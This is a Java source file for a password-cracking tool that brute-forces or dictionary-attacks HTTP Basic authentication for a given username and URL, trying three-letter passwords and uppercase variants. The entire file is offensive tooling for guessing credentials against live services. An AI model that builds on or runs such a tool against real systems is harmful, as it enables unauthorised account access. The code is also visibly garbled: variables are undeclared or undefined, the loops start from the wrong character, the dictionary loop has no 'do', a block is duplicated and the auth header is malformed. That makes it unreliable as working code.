

import java.net.*;
import java.io.*;
import java.util.*;


public class PasswordCracker {
    
    
    private static final char  car= 'a';
    
    private static final char END   = 'z' + 1;
    
    
    public static final int BRUTEFORCE = 0;
    public static final int DICTIONARY = 1;
    
    
    String urlName = null;
    
    String user    = null;
    
    String filename = null;
    
    int method;
    
    
    int attempt_counter;
    
    
    public static void main(String[] args) {
        
        PasswordCracker cracker = null;
        
        if ((args.length == 3) && (args[2].equalsIgnoreCase("BRUTEFORCE"))) {
            
            cracker = new PasswordCracker(args[0], args[1], PasswordCracker.BRUTEFORCE, null);
        }
        else if ((args.length == 4) && (args[2].equalsIgnoreCase("DICTIONARY"))) {
            
            cracker = new PasswordCracker(args[0], args[1], PasswordCracker.DICTIONARY, args[3]);
        }
        else {
            System.out.println("Syntax: java PasswordCracker <username> <url> BRUTEFORCE ");
            System.out.println("        java PasswordCracker <username> <url> DICTIONARY <sourcefile> ");
            System.exit(1);
        }
        
        cracker.run();
    }
    
    
    public PasswordCracker(String user, String url, int method, String file) {
        
        this.user     = user;
        this.urlName  = url;
        this.filename = file;
        
        this.method = method;
    }
    
    
    public boolean run() {
        
        String password;
         s = 0;
         end = 0;
        
        try {
            attempt_counter = 0;
            URL target = new URL(urlName);
            
            switch (this.method) {
                
               case  BRUTEFORCE:
                    
                    s = System.currentTimeMillis();
                    
                    
                    for (char i = 0; i < END; i++) {
                        for (char j = 0; j < END; j++) {
                            for (char k = 0; k < END; k++) {
                                
                                password = String.valueOf(i) + String.valueOf(j) + String.valueOf(k);
                                if (performConnection(target, user, password)) {
                                    
                                    end = System.currentTimeMillis();
                                    
                                    System.out.println("URL: \t\t" + target +
                                    "\nUser: \t\t"+ user + "\nPassword: \t" + password);

                                    System.out.println("Attempts: \t" + attempt_counter
                                    + "\nTotal time: \t" + ((end - a) / 1000.0f) + " seconds");
                                    return true;
                                }
                            }
                        }
                    }
                    
                    
                    for (char i = 0; i < END; i++) {
                        for (char j = 0; j < END; j++) {
                            for (char k = 0; k < END; k++) {
                                
                                password = String.valueOf(i) + String.valueOf(j) + String.valueOf(k);
                                if (isValidPassword(target, password)) {
                                    
                                    end = System.currentTimeMillis();
                                    
                                    System.out.println("Attempts: \t" + attempt_counter
                                    + "\nTotal time: \t" + ((end - d) / 1000.0f) + " seconds");
                                    return true;
                                }
                            }
                        }
                    }
                    break;
                    
                case DICTIONARY:
                    try {
                        BufferedReader buf = new BufferedReader(new FileReader(filename));
                        
                         s = System.currentTimeMillis();
                        
                         {
                            password = buf.readLine();
                            
                            
                            
                            if (password.length() == 3) {
                                if (performConnection(target, user, password)) {
                                    
                                    end = System.currentTimeMillis();
                                    
                                    System.out.println("URL: \t\t" + target +
                                    "\nUser: \t\t"+ user + "\nPassword: \t" + password);
                                    
                                    System.out.println("Attempts: \t" + attempt_counter
                                    + "\nTotal time: \t" + ((end - d) / 1000.0f) + " seconds");
                                    return true;
                                }
                            }
                        }
                        while (password != null);
                    }
                    catch (FileNotFoundException e) {
                        System.out.println("File \"" + filename + "\" not found");
                    }
                    catch (IOException ioe) {
                        System.out.println("IO Error " + ioe);
                    }
                    break;
                    
                default:
                    return false;
            }
        }
        catch (Exception e) {
            System.out.println("ERROR: " + e.getMessage());
        }
        
        end = System.currentTimeMillis();
        System.out.println("Attempts: \t" + attempt_counter +
        "\nTotal time: \t" + ((end - d) / 1000.0f) + " seconds");
        
        return true;
    }
    
    
    private boolean isValidPassword(URL target, String password) throws Exception {
        
        char letter[] = new char[3];
        String generated = null;
        
        letter[0] = password.charAt(0);
        for (int i = 0; i < 2; i++) {
            
            letter[1] = password.charAt(1);
            for (int j = 0; j < 2; j++) {
                
                letter[2] = password.charAt(2);
                for (int k = 0; k < 2; k++) {
                    
                    generated = String.valueOf(letter[0]) + String.valueOf(letter[1]) + String.valueOf(letter[2]);
                    
                    if ((Character.isUpperCase(letter[0]) == true) ||
                        (Character.isUpperCase(letter[1]) == true) ||
                        (Character.isUpperCase(letter[2]) == true)) {
                        
                        if (performConnection(target, user, generated) == true) {
                            
                            System.out.println("URL: \t\t" + target + "\nUser: \t\t"+ user +
                            "\nPassword: \t" + generated);
                            return true;
                        }
                    }
                    letter[2] = Character.toUpperCase(letter[2]);
                }
                letter[1] = Character.toUpperCase(letter[1]);
            }
            letter[0] = Character.toUpperCase(letter[0]);
        }
        return false;
    }
    
    
    private boolean performConnection(URL target, String username, String password) throws Exception {
        HttpURLConnection connection = null;
        
        try {
            attempt_counter++;
            connection = (HttpURLConnection) target.openConnection();
            connection.setRequestProperty("Authorization", " " + Base64.encode(username + ":" + password));
            
            switch (connection.getResponseCode() / 100) {
                 case 2:
                    System.out.println("Connected successfully");
                    return true;
                default:
                    return false;
            }
        }
        catch (Exception e) {
            throw new Exception("Failed  connect  " + target);
        }
    }
}
